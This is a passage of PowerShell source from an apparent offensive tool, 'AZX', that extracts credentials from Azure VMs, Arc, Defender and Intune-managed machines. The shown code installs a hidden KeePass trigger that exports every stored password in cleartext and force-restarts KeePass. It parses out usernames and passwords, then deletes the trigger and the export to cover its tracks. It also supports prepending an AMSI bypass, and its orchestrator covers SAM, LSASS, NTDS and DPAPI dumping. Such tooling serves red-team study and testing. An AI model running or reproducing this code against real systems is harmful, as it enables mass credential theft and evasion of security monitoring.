        [string]$KeePassAction = "all",

        [Parameter(Mandatory = $false)]
        [string]$KeePassConfigPath = "",

        [Parameter(Mandatory = $false)]
        [string]$ExportPath = ""
    )

    $scriptTemplate = @'
$action = "##ACTION##"
$configPath = "##CONFIG_PATH##"
$exportPath = "##EXPORT_PATH##"
$results = @{
    Action = $action
    Credentials = @()
    TriggerAdded = $false
    ExportFound = $false
    Cleaned = $false
    Error = $null
}

function Find-KeePassConfig {
    if ($configPath -and (Test-Path $configPath)) { return $configPath }
    $searchPaths = @("$env:ProgramFiles\KeePass Password Safe 2", "${env:ProgramFiles(x86)}\KeePass Password Safe 2")
    $profiles = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') }
    foreach ($p in $profiles) { $searchPaths += "$($p.FullName)\AppData\Roaming\KeePass" }
    foreach ($sp in $searchPaths) {
        $cfg = Join-Path $sp "KeePass.config.xml"
        if (Test-Path $cfg) { return $cfg }
    }
    return $null
}

function Add-KeePassTrigger {
    param([string]$ConfigFile, [string]$ExportFile)
    try {
        [xml]$config = Get-Content $ConfigFile -Raw
        $app = $config.Configuration.Application
        if (-not $app) {
            $results.Error = "Invalid KeePass config structure"
            return $false
        }
        $triggerSystem = $app.TriggerSystem
        if (-not $triggerSystem) {
            $triggerSystem = $config.CreateElement("TriggerSystem")
            $app.AppendChild($triggerSystem) | Out-Null
        }
        $triggers = $triggerSystem.Triggers
        if (-not $triggers) {
            $triggers = $config.CreateElement("Triggers")
            $triggerSystem.AppendChild($triggers) | Out-Null
        }
        # Check if trigger already exists
        $existing = $triggers.SelectNodes("Trigger[Name='AZX Export Trigger']")
        if ($existing.Count -gt 0) {
            $results.TriggerAdded = $true
            return $true
        }
        $triggerXml = @"
<Trigger>
    <Guid>azx-export-trigger-001</Guid>
    <Name>AZX Export Trigger</Name>
    <Enabled>true</Enabled>
    <Events>
        <Event>
            <TypeGuid>2PMe6cxpTBCDFJwoPqiMog==</TypeGuid>
            <Parameters />
        </Event>
    </Events>
    <Conditions />
    <Actions>
        <Action>
            <TypeGuid>Iq135Bd4Tu2ZtFcdArOtTQ==</TypeGuid>
            <Parameters>
                <Parameter>$ExportFile</Parameter>
                <Parameter>KeePass XML (2.x)</Parameter>
                <Parameter />
                <Parameter />
            </Parameters>
        </Action>
    </Actions>
</Trigger>
"@
        $triggerDoc = New-Object System.Xml.XmlDocument
        $triggerDoc.LoadXml($triggerXml)
        $imported = $config.ImportNode($triggerDoc.DocumentElement, $true)
        $triggers.AppendChild($imported) | Out-Null
        $config.Save($ConfigFile)
        $results.TriggerAdded = $true
        return $true
    } catch {
        $results.Error = "Failed to add trigger: $($_.Exception.Message)"
        return $false
    }
}

function Check-KeePassTrigger {
    param([string]$ConfigFile)
    try {
        [xml]$config = Get-Content $ConfigFile -Raw
        $existing = $config.SelectNodes("//Trigger[Name='AZX Export Trigger']")
        $results.TriggerAdded = ($existing.Count -gt 0)
    } catch {
        $results.Error = "Failed to check trigger: $($_.Exception.Message)"
    }
}

function Poll-KeePassExport {
    param([string]$ExportFile)
    if (-not (Test-Path $ExportFile)) { return }
    $results.ExportFound = $true
    try {
        [xml]$export = Get-Content $ExportFile -Raw
        $entries = $export.SelectNodes("//Entry")
        foreach ($entry in $entries) {
            $title = ($entry.String | Where-Object { $_.Key -eq 'Title' }).Value
            $username = ($entry.String | Where-Object { $_.Key -eq 'UserName' }).Value
            $password = ($entry.String | Where-Object { $_.Key -eq 'Password' }).Value
            $url = ($entry.String | Where-Object { $_.Key -eq 'URL' }).Value
            if ($title -or $username -or $password) {
                $results.Credentials += @{
                    Title = if ($title) { $title } else { "" }
                    Username = if ($username) { $username } else { "" }
                    Password = if ($password) { $password } else { "" }
                    URL = if ($url) { $url } else { "" }
                }
            }
        }
    } catch {
        $results.Error = "Failed to parse export: $($_.Exception.Message)"
    }
}

function Clean-KeePassTrigger {
    param([string]$ConfigFile, [string]$ExportFile)
    try {
        [xml]$config = Get-Content $ConfigFile -Raw
        $triggers = $config.SelectNodes("//Trigger[Name='AZX Export Trigger']")
        foreach ($t in $triggers) { $t.ParentNode.RemoveChild($t) | Out-Null }
        $config.Save($ConfigFile)
        if (Test-Path $ExportFile) { Remove-Item $ExportFile -Force }
        $results.Cleaned = $true
    } catch {
        $results.Error = "Failed to clean: $($_.Exception.Message)"
    }
}

try {
    $cfg = Find-KeePassConfig
    if (-not $cfg) {
        $results.Error = "KeePass config not found"
        Write-Output "---KEEPASS_TRIGGER---"
        Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
        Write-Output "---SUCCESS---"
        return
    }
    if (-not $exportPath) {
        $exportPath = Join-Path (Split-Path $cfg -Parent) "export.xml"
    }
    switch ($action) {
        "add" { Add-KeePassTrigger -ConfigFile $cfg -ExportFile $exportPath }
        "check" { Check-KeePassTrigger -ConfigFile $cfg }
        "restart" {
            Stop-Process -Name KeePass -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 2
            $keepassExe = Join-Path (Split-Path $cfg -Parent) "KeePass.exe"
            if (-not (Test-Path $keepassExe)) {
                $keepassExe = Get-ChildItem -Path "$env:ProgramFiles\KeePass*","${env:ProgramFiles(x86)}\KeePass*" -Filter "KeePass.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
                if ($keepassExe) { $keepassExe = $keepassExe.FullName }
            }
            if ($keepassExe -and (Test-Path $keepassExe)) {
                Start-Process $keepassExe -ErrorAction SilentlyContinue
            }
        }
        "poll" { Poll-KeePassExport -ExportFile $exportPath }
        "clean" { Clean-KeePassTrigger -ConfigFile $cfg -ExportFile $exportPath }
        "all" {
            $added = Add-KeePassTrigger -ConfigFile $cfg -ExportFile $exportPath
            if ($added) {
                Stop-Process -Name KeePass -Force -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 2
                $keepassExe = Join-Path (Split-Path $cfg -Parent) "KeePass.exe"
                if (-not (Test-Path $keepassExe)) {
                    $keepassExe = Get-ChildItem -Path "$env:ProgramFiles\KeePass*","${env:ProgramFiles(x86)}\KeePass*" -Filter "KeePass.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
                    if ($keepassExe) { $keepassExe = $keepassExe.FullName }
                }
                if ($keepassExe -and (Test-Path $keepassExe)) {
                    Start-Process $keepassExe -ErrorAction SilentlyContinue
                }
                for ($i = 0; $i -lt 5; $i++) {
                    Start-Sleep -Seconds 10
                    Poll-KeePassExport -ExportFile $exportPath
                    if ($results.ExportFound) { break }
                }
                Clean-KeePassTrigger -ConfigFile $cfg -ExportFile $exportPath
            }
        }
    }
} catch {
    $results.Error = $_.Exception.Message
}
Write-Output "---KEEPASS_TRIGGER---"
Write-Output ($results | ConvertTo-Json -Depth 5 -Compress)
Write-Output "---SUCCESS---"
'@

    $scriptTemplate = $scriptTemplate -replace '##ACTION##', $KeePassAction
    $scriptTemplate = $scriptTemplate -replace '##CONFIG_PATH##', $KeePassConfigPath
    $scriptTemplate = $scriptTemplate -replace '##EXPORT_PATH##', $ExportPath
    return $scriptTemplate
}

function Parse-KeePassTriggerOutput {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Output
    )

    $result = @{
        Success = $false
        Action = ""
        Credentials = @()
        TriggerAdded = $false
        ExportFound = $false
        Cleaned = $false
        Error = $null
    }

    if ($Output -match "---ERROR---") {
        $errorMsg = ($Output -split "---ERROR---")[1].Trim()
        $result.Error = $errorMsg
        return [PSCustomObject]$result
    }

    if ($Output -notmatch "---SUCCESS---") {
        $result.Error = "KeePass trigger extraction did not complete successfully"
        return [PSCustomObject]$result
    }

    try {
        if ($Output -match "---KEEPASS_TRIGGER---\s*(.+)\s*---SUCCESS---") {
            $data = $Matches[1].Trim()
            $parsed = $data | ConvertFrom-Json
            $result.Action = if ($parsed.Action) { $parsed.Action } else { "" }
            $result.Credentials = if ($parsed.Credentials) { $parsed.Credentials } else { @() }
            $result.TriggerAdded = [bool]$parsed.TriggerAdded
            $result.ExportFound = [bool]$parsed.ExportFound
            $result.Cleaned = [bool]$parsed.Cleaned
            $result.Error = $parsed.Error
            $result.Success = $true
        }
    } catch {
        $result.Error = "Failed to parse KeePass trigger JSON: $($_.Exception.Message)"
    }

    return [PSCustomObject]$result
}

function Invoke-KeePassTriggerExtraction {
    param(
        [Parameter(Mandatory = $true)]
        $Target,

        [Parameter(Mandatory = $false)]
        [ValidateSet("add", "check", "restart", "poll", "clean", "all")]
        [string]$KeePassAction = "all",

        [Parameter(Mandatory = $false)]
        [string]$KeePassConfigPath = "",

        [Parameter(Mandatory = $false)]
        [string]$KeePassExportPath = "",

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300
    )

    $result = @{
        TargetName = $Target.Name
        TargetType = $Target.Type
        ResourceGroup = $Target.ResourceGroup
        Subscription = $Target.Subscription
        OSType = $Target.OSType
        ExtractionType = "KEEPASS_TRIGGER"
        Success = $false
        Data = $null
        Error = $null
    }

    if ($Target.OSType -ne "Windows") {
        $result.Error = "KeePass trigger extraction is only supported on Windows targets"
        return [PSCustomObject]$result
    }

    try {
        if ($Target.SubscriptionId) {
            Set-AzContext -SubscriptionId $Target.SubscriptionId -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null
        }

        $script = Get-KeePassTriggerScript -KeePassAction $KeePassAction -KeePassConfigPath $KeePassConfigPath -ExportPath $KeePassExportPath

        if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
            $amsiContent = Get-Content -Path $AmsiBypass -Raw
            $script = $amsiContent + "`n" + $script
        }

        $output = ""

        if ($Target.Type -eq "AzureVM") {
            $cmdResult = Invoke-AzVMRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -VMName $Target.Name `
                -CommandId "RunPowerShellScript" `
                -ScriptString $script `
                -ErrorAction Stop
            $output = $cmdResult.Value[0].Message

        } elseif ($Target.Type -eq "Arc") {
            $runCommandName = "azx-keepasst-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
            $arcResult = Invoke-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -Location $Target.Location `
                -RunCommandName $runCommandName `
                -SourceScript $script `
                -ErrorAction Stop
            $output = $arcResult.InstanceViewOutput
            Remove-AzConnectedMachineRunCommand `
                -ResourceGroupName $Target.ResourceGroup `
                -MachineName $Target.Name `
                -RunCommandName $runCommandName `
                -ErrorAction SilentlyContinue

        } elseif ($Target.Type -eq "MDEDevice") {
            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
            $mdeResult = Invoke-MDELiveResponse `
                -MachineId $Target.MDEMachineId `
                -Command $script `
                -AccessToken $Target.MDEToken `
                -Timeout $Timeout
            if ($mdeResult.Status -eq "Success") {
                $output = $mdeResult.Output
            } else {
                throw "MDE Live Response failed: $($mdeResult.Output)"
            }

        } elseif ($Target.Type -eq "IntuneDevice") {
            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
            $intuneResult = Invoke-IntuneRemediation `
                -DeviceId $Target.IntuneDeviceId `
                -Command $script `
                -PowerShell:$true `
                -DeviceName $Target.Name
            if ($intuneResult.Status -eq "Triggered") {
                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
                $result.Error = "Intune extraction is async-only - check Intune portal for results"
            } else {
                throw "Intune Remediation failed: $($intuneResult.Output)"
            }
        }

        $output = $output -replace "Enable succeeded:", ""
        $output = $output -replace "\[stdout\]", ""
        $output = $output -replace "\[stderr\]", ""
        $output = $output.Trim()

        $parsed = Parse-KeePassTriggerOutput -Output $output

        $result.Data = $parsed
        $result.Success = $parsed.Success
        if ($parsed.Error) {
            $result.Error = $parsed.Error
        }

    } catch {
        $result.Error = $_.Exception.Message
    }

    return [PSCustomObject]$result
}

# ============================================
# MAIN ORCHESTRATOR FUNCTION
# ============================================

<#
.SYNOPSIS
    Main credential extraction orchestrator (Azure equivalent of NetExec --sam).
.DESCRIPTION
    Coordinates credential extraction across Azure VMs, Arc devices, MDE devices, and Intune devices.
    Supports SAM hash dumping, Managed Identity token extraction, and DPAPI secrets.

    Execution Methods:
    - vmrun: Azure VM Run Command (sync)
    - arc: Arc Run Command (sync)
    - mde: MDE Live Response (async with polling)
    - intune: Intune Proactive Remediation (async, portal output only)
    - auto: Tries Arc, then MDE, then Intune based on device type
.PARAMETER VMName
    Target a specific Azure VM by name.
.PARAMETER AllVMs
    Target all Azure VMs.
.PARAMETER DeviceName
    Target a specific device by name (Arc, MDE, or Intune).
.PARAMETER AllDevices
    Target all devices.
.PARAMETER ResourceGroup
    Filter by resource group.
.PARAMETER SubscriptionId
    Filter by subscription.
.PARAMETER CredMethod
    Extraction method: auto, sam, tokens, dpapi, all.
.PARAMETER HashcatFormat
    Output hashes in hashcat format.
.PARAMETER JohnFormat
    Output hashes in John the Ripper format.
.PARAMETER AmsiBypass
    Path to AMSI bypass script.
.PARAMETER Timeout
    Execution timeout in seconds.
.PARAMETER ExportPath
    Path to export results.
.PARAMETER ExecMethod
    Execution method: auto, vmrun, arc, mde, intune. Default is auto.
#>
function Invoke-CredentialExtraction {
    param(
        [Parameter(Mandatory = $false)]
        [string]$VMName,

        [Parameter(Mandatory = $false)]
        [switch]$AllVMs,

        [Parameter(Mandatory = $false)]
        [string]$DeviceName,

        [Parameter(Mandatory = $false)]
        [switch]$AllDevices,

        [Parameter(Mandatory = $false)]
        [string]$ResourceGroup,

        [Parameter(Mandatory = $false)]
        [string]$SubscriptionId,

        [Parameter(Mandatory = $false)]
        [ValidateSet("auto", "sam", "tokens", "dpapi", "lsa", "ntds", "lsass", "backup", "sccm", "wam", "wifi", "putty", "notepad", "notepadpp", "keepass_discover", "keepass_trigger", "rdcman", "eventlog_creds", "winscp", "vnc", "mremoteng", "veeam", "all")]
        [string]$CredMethod = "auto",

        [Parameter(Mandatory = $false)]
        [switch]$HashcatFormat,

        [Parameter(Mandatory = $false)]
        [switch]$JohnFormat,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300,

        [Parameter(Mandatory = $false)]
        [string]$ExportPath,

        [Parameter(Mandatory = $false)]
        [ValidateSet("auto", "vmrun", "arc", "mde", "intune")]
        [string]$ExecMethod = "auto",

        # NTDS-specific options
        [Parameter(Mandatory = $false)]
        [ValidateSet("vss", "ntdsutil", "drsuapi")]
        [string]$NTDSMethod = "vss",

        # LSASS-specific options
        [Parameter(Mandatory = $false)]
        [ValidateSet("comsvcs", "procdump", "nanodump", "direct")]
        [string]$LsassMethod = "comsvcs",

        # SCCM-specific options
        [Parameter(Mandatory = $false)]
        [ValidateSet("disk", "api")]
        [string]$SCCMMethod = "disk",

        # NTDS filtering options
        [Parameter(Mandatory = $false)]
        [switch]$EnabledOnly,

        [Parameter(Mandatory = $false)]
        [string]$TargetDomainUser,

        # WAM DPAPI decryption support
        [Parameter(Mandatory = $false)]
        [string]$PVKFile,

        [Parameter(Mandatory = $false)]
        [string]$MasterKeyFile,

        # KeePass trigger options
        [Parameter(Mandatory = $false)]
        [string]$KeePassConfigPath,

        [Parameter(Mandatory = $false)]
        [ValidateSet("add", "check", "restart", "poll", "clean", "all")]
        [string]$KeePassAction = "all",

        [Parameter(Mandatory = $false)]
        [string]$KeePassExportPath
    )

    # Show banner
    Write-ColorOutput -Message "`n[*] AZX - Credential Extraction" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: creds (Azure equivalent of nxc smb --sam/--lsa/--ntds)`n" -Color "Cyan"

    # Show OPSEC warning
    Show-CredentialOPSECWarning -CredMethod $CredMethod

    # Determine extraction methods to run
    $runSAM = $false
    $runTokens = $false
    $runDPAPI = $false
    $runLSA = $false
    $runNTDS = $false
    $runLSASS = $false
    $runBackup = $false
    $runSCCM = $false
    $runWAM = $false
    $runWiFi = $false
    $runPuTTY = $false
    $runNotepad = $false
    $runNotepadPP = $false
    $runKeePassDiscover = $false
    $runKeePassTrigger = $false
    $runRDCMan = $false
    $runEventLogCreds = $false
    $runWinSCP = $false
    $runVNC = $false
    $runMRemoteNG = $false
    $runVeeam = $false

    switch ($CredMethod) {
        "sam" { $runSAM = $true }
        "tokens" { $runTokens = $true }
        "dpapi" { $runDPAPI = $true }
        "lsa" { $runLSA = $true }
        "ntds" { $runNTDS = $true }
        "lsass" { $runLSASS = $true }
        "backup" { $runBackup = $true }
        "sccm" { $runSCCM = $true }
        "wam" { $runWAM = $true }
        "wifi" { $runWiFi = $true }
        "putty" { $runPuTTY = $true }
        "notepad" { $runNotepad = $true }
        "notepadpp" { $runNotepadPP = $true }
        "keepass_discover" { $runKeePassDiscover = $true }
        "keepass_trigger" { $runKeePassTrigger = $true }
        "rdcman" { $runRDCMan = $true }
        "eventlog_creds" { $runEventLogCreds = $true }
        "winscp" { $runWinSCP = $true }
        "vnc" { $runVNC = $true }
        "mremoteng" { $runMRemoteNG = $true }
        "veeam" { $runVeeam = $true }
        "all" {
            $runSAM = $true; $runTokens = $true; $runDPAPI = $true
            $runLSA = $true; $runNTDS = $true; $runLSASS = $true
            $runBackup = $true; $runSCCM = $true; $runWAM = $true
            $runWiFi = $true; $runPuTTY = $true; $runNotepad = $true
            $runNotepadPP = $true; $runKeePassDiscover = $true
            $runKeePassTrigger = $true; $runRDCMan = $true
            $runEventLogCreds = $true; $runWinSCP = $true
            $runVNC = $true; $runMRemoteNG = $true; $runVeeam = $true
        }
        "auto" {
            # Auto mode stays conservative - only original methods
            $runSAM = $true; $runTokens = $true; $runDPAPI = $true
        }
    }

    # Collect targets
    $targets = @()
    $seenTargets = @{}  # For deduplication

    # Azure VMs
    if ($VMName -or $AllVMs) {
        Write-ColorOutput -Message "[*] Enumerating Azure VMs..." -Color "Yellow"

        $subscriptions = Get-AzSubscription -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        if ($SubscriptionId) {
            $subscriptions = $subscriptions | Where-Object { $_.Id -eq $SubscriptionId -or $_.Name -eq $SubscriptionId }
        }

        foreach ($sub in $subscriptions) {
            Set-AzContext -SubscriptionId $sub.Id -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null

            $vms = Get-AzVM -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
            if ($ResourceGroup) {
                $vms = $vms | Where-Object { $_.ResourceGroupName -eq $ResourceGroup }
            }
            if ($VMName) {
                $vms = $vms | Where-Object { $_.Name -eq $VMName }
            }

            foreach ($vm in $vms) {
                # Deduplication key: Name + ResourceGroup + SubscriptionId
                $dedupeKey = "$($vm.Name)|$($vm.ResourceGroupName)|$($sub.Id)"
                if ($seenTargets.ContainsKey($dedupeKey)) {
                    continue
                }
                $seenTargets[$dedupeKey] = $true

                $osType = if ($vm.StorageProfile.OsDisk.OsType -eq "Windows") { "Windows" } else { "Linux" }
                $targets += [PSCustomObject]@{
                    Name = $vm.Name
                    Type = "AzureVM"
                    ResourceGroup = $vm.ResourceGroupName
                    Subscription = $sub.Name
                    SubscriptionId = $sub.Id
                    OSType = $osType
                    Location = $vm.Location
                }
            }
        }
    }

    # Arc Devices
    if ($DeviceName -or $AllDevices) {
        Write-ColorOutput -Message "[*] Enumerating Arc devices..." -Color "Yellow"

        $subscriptions = Get-AzSubscription -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        if ($SubscriptionId) {
            $subscriptions = $subscriptions | Where-Object { $_.Id -eq $SubscriptionId -or $_.Name -eq $SubscriptionId }
        }

        foreach ($sub in $subscriptions) {
            Set-AzContext -SubscriptionId $sub.Id -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null

            $arcMachines = Get-AzConnectedMachine -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
            if ($ResourceGroup) {
                $arcMachines = $arcMachines | Where-Object { $_.ResourceGroupName -eq $ResourceGroup }
            }
            if ($DeviceName) {
                $arcMachines = $arcMachines | Where-Object { $_.Name -eq $DeviceName }
            }

            foreach ($arc in $arcMachines) {
                # Deduplication key
                $dedupeKey = "$($arc.Name)|$($arc.ResourceGroupName)|$($sub.Id)"
                if ($seenTargets.ContainsKey($dedupeKey)) {
                    continue
                }
                $seenTargets[$dedupeKey] = $true

                $osType = if ($arc.OSName -match "Windows") { "Windows" } else { "Linux" }
                $targets += [PSCustomObject]@{
                    Name = $arc.Name
                    Type = "Arc"
                    ResourceGroup = $arc.ResourceGroupName
                    Subscription = $sub.Name
                    SubscriptionId = $sub.Id
                    OSType = $osType
                    Location = $arc.Location
                }
            }
        }
    }

    # MDE Devices (when using -DeviceName or -AllDevices with MDE method)
    if (($DeviceName -or $AllDevices) -and $ExecMethod -in @("mde", "auto")) {
        Write-ColorOutput -Message "[*] Enumerating MDE devices..." -Color "Yellow"

        try {
            $mdeToken = Get-MDEAccessToken
            if ($mdeToken) {
                if ($DeviceName) {
                    # Single device lookup
                    $mdeDevice = Get-MDEDevice -DeviceName $DeviceName -AccessToken $mdeToken
                    if ($mdeDevice) {
                        $dedupeKey = "$($mdeDevice.computerDnsName)|MDE|$($mdeDevice.id)"
                        if (-not $seenTargets.ContainsKey($dedupeKey)) {
                            $seenTargets[$dedupeKey] = $true
                            $targets += [PSCustomObject]@{
                                Name = $mdeDevice.computerDnsName
                                Type = "MDEDevice"
                                ResourceGroup = "MDE"
                                Subscription = "MDE"
                                SubscriptionId = $null
                                OSType = if ($mdeDevice.osPlatform -match "Windows") { "Windows" } else { "Linux" }
                                Location = $mdeDevice.rbacGroupName
                                MDEMachineId = $mdeDevice.id
                                MDEToken = $mdeToken
                            }
                        }
                    }
                }
                # Note: AllDevices for MDE would require listing all machines - typically too many
            }
        } catch {
            Write-ColorOutput -Message "[!] MDE enumeration failed: $($_.Exception.Message)" -Color "Red"
        }
    }

    # Intune Devices (when using -DeviceName or -AllDevices with Intune method)
    if (($DeviceName -or $AllDevices) -and $ExecMethod -in @("intune", "auto")) {
        Write-ColorOutput -Message "[*] Enumerating Intune devices..." -Color "Yellow"

        try {
            if ($DeviceName) {
                $intuneDevice = Get-IntuneDevice -DeviceName $DeviceName
                if ($intuneDevice) {
                    $dedupeKey = "$($intuneDevice.deviceName)|Intune|$($intuneDevice.id)"
                    if (-not $seenTargets.ContainsKey($dedupeKey)) {
                        $seenTargets[$dedupeKey] = $true
                        $targets += [PSCustomObject]@{
                            Name = $intuneDevice.deviceName
                            Type = "IntuneDevice"
                            ResourceGroup = "Intune"
                            Subscription = "Intune"
                            SubscriptionId = $null
                            OSType = if ($intuneDevice.operatingSystem -match "Windows") { "Windows" } else { "Linux" }
                            Location = "Intune"
                            IntuneDeviceId = $intuneDevice.id
                        }
                    }
                }
            }
        } catch {
            Write-ColorOutput -Message "[!] Intune enumeration failed: $($_.Exception.Message)" -Color "Red"
        }
    }

    if ($targets.Count -eq 0) {
        Write-ColorOutput -Message "[!] No targets found matching criteria" -Color "Red"
        return
    }

    Write-ColorOutput -Message "[*] Found $($targets.Count) target(s)`n" -Color "Green"

    # Results collection
    $allResults = @()
    $stats = @{
        Targets = $targets.Count
        SAMHashes = 0
        Tokens = 0
        DPAPISecrets = 0
        LSASecrets = 0
        NTDSHashes = 0
        LSASSCreds = 0
        BackupHashes = 0
        SCCMFindings = 0
        WAMTokens = 0
        WiFiProfiles = 0
        PuTTYSessions = 0
        NotepadTabs = 0
        NotepadPPFiles = 0
        KeePassFindings = 0
        KeePassCreds = 0
        RDCManConnections = 0
        EventLogCreds = 0
        WinSCPSessions = 0
        VNCPasswords = 0
        MRemoteNGConnections = 0
        VeeamCreds = 0
        Errors = 0
    }

    # Process each target
    foreach ($target in $targets) {
        Write-ColorOutput -Message "[*] Target: $($target.Name) ($($target.OSType)) [RG: $($target.ResourceGroup), Sub: $($target.Subscription)]" -Color "Cyan"

        # SAM Extraction
        if ($runSAM -and $target.OSType -eq "Windows") {
            $samResult = Invoke-SAMExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $samResult

            if ($samResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "SAM" -Data $samResult.Data
                if ($samResult.Data.Hashes) {
                    $stats.SAMHashes += $samResult.Data.Hashes.Count
                }
            } else {
                $stats.Errors++
                if ($samResult.Error) {
                    Write-ColorOutput -Message "    [!] SAM extraction failed: $($samResult.Error)" -Color "Red"
                }
            }
        }

        # Token Extraction
        if ($runTokens) {
            $tokenResult = Invoke-TokenExtraction -Target $target -Timeout $Timeout
            $allResults += $tokenResult

            if ($tokenResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "TOKEN" -Data $tokenResult.Data
                if ($tokenResult.Data.Tokens) {
                    $stats.Tokens += $tokenResult.Data.Tokens.Count
                }
            } else {
                $stats.Errors++
                if ($tokenResult.Error) {
                    Write-ColorOutput -Message "    [!] Token extraction failed: $($tokenResult.Error)" -Color "Red"
                }
            }
        }

        # DPAPI Extraction
        if ($runDPAPI -and $target.OSType -eq "Windows") {
            $dpapiResult = Invoke-DPAPIExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $dpapiResult

            if ($dpapiResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "DPAPI" -Data $dpapiResult.Data
                if ($dpapiResult.Data) {
                    $wifiCount = if ($dpapiResult.Data.WiFiProfiles) { $dpapiResult.Data.WiFiProfiles.Count } else { 0 }
                    $credCount = if ($dpapiResult.Data.CredentialManager) { $dpapiResult.Data.CredentialManager.Count } else { 0 }
                    $browserCount = if ($dpapiResult.Data.BrowserPaths) { $dpapiResult.Data.BrowserPaths.Count } else { 0 }
                    $stats.DPAPISecrets += ($wifiCount + $credCount + $browserCount)
                }
            } else {
                $stats.Errors++
                if ($dpapiResult.Error) {
                    Write-ColorOutput -Message "    [!] DPAPI extraction failed: $($dpapiResult.Error)" -Color "Red"
                }
            }
        }

        # LSA Secrets Extraction
        if ($runLSA -and $target.OSType -eq "Windows") {
            $lsaResult = Invoke-LSAExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $lsaResult

            if ($lsaResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "LSA" -Data $lsaResult.Data
                if ($lsaResult.Data.Secrets) { $stats.LSASecrets += $lsaResult.Data.Secrets.Count }
                if ($lsaResult.Data.CachedDomainCreds) { $stats.LSASecrets += $lsaResult.Data.CachedDomainCreds.Count }
            } else {
                $stats.Errors++
                if ($lsaResult.Error) {
                    Write-ColorOutput -Message "    [!] LSA extraction failed: $($lsaResult.Error)" -Color "Red"
                }
            }
        }

        # NTDS.dit Extraction
        if ($runNTDS -and $target.OSType -eq "Windows") {
            $ntdsResult = Invoke-NTDSExtraction -Target $target -NTDSMethod $NTDSMethod `
                -EnabledOnly:$EnabledOnly -TargetDomainUser $TargetDomainUser `
                -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $ntdsResult

            if ($ntdsResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "NTDS" -Data $ntdsResult.Data
                if ($ntdsResult.Data.Hashes) { $stats.NTDSHashes += $ntdsResult.Data.Hashes.Count }
            } else {
                $stats.Errors++
                if ($ntdsResult.Error) {
                    Write-ColorOutput -Message "    [!] NTDS extraction failed: $($ntdsResult.Error)" -Color "Red"
                }
            }
        }

        # LSASS Memory Dump
        if ($runLSASS -and $target.OSType -eq "Windows") {
            $lsassResult = Invoke-LSASSExtraction -Target $target -LsassMethod $LsassMethod `
                -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $lsassResult

            if ($lsassResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "LSASS" -Data $lsassResult.Data
                if ($lsassResult.Data.Credentials) { $stats.LSASSCreds += $lsassResult.Data.Credentials.Count }
            } else {
                $stats.Errors++
                if ($lsassResult.Error) {
                    Write-ColorOutput -Message "    [!] LSASS extraction failed: $($lsassResult.Error)" -Color "Red"
                }
            }
        }

        # Backup Operator Extraction
        if ($runBackup -and $target.OSType -eq "Windows") {
            $backupResult = Invoke-BackupOperatorExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $backupResult

            if ($backupResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "BACKUP" -Data $backupResult.Data
                if ($backupResult.Data.Hashes) { $stats.BackupHashes += $backupResult.Data.Hashes.Count }
            } else {
                $stats.Errors++
                if ($backupResult.Error) {
                    Write-ColorOutput -Message "    [!] Backup extraction failed: $($backupResult.Error)" -Color "Red"
                }
            }
        }

        # SCCM/Intune Extraction
        if ($runSCCM) {
            $sccmResult = Invoke-SCCMExtraction -Target $target -SCCMMethod $SCCMMethod `
                -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $sccmResult

            if ($sccmResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "SCCM" -Data $sccmResult.Data
                $sccmCount = 0
                if ($sccmResult.Data.GPPPasswords) { $sccmCount += $sccmResult.Data.GPPPasswords.Count }
                if ($sccmResult.Data.SCCMCacheFindings) { $sccmCount += $sccmResult.Data.SCCMCacheFindings.Count }
                if ($sccmResult.Data.IntuneScripts) { $sccmCount += $sccmResult.Data.IntuneScripts.Count }
                if ($sccmResult.Data.IISConfigs) { $sccmCount += $sccmResult.Data.IISConfigs.Count }
                if ($sccmResult.Data.GraphAPIFindings) { $sccmCount += $sccmResult.Data.GraphAPIFindings.Count }
                $stats.SCCMFindings += $sccmCount
            } else {
                $stats.Errors++
                if ($sccmResult.Error) {
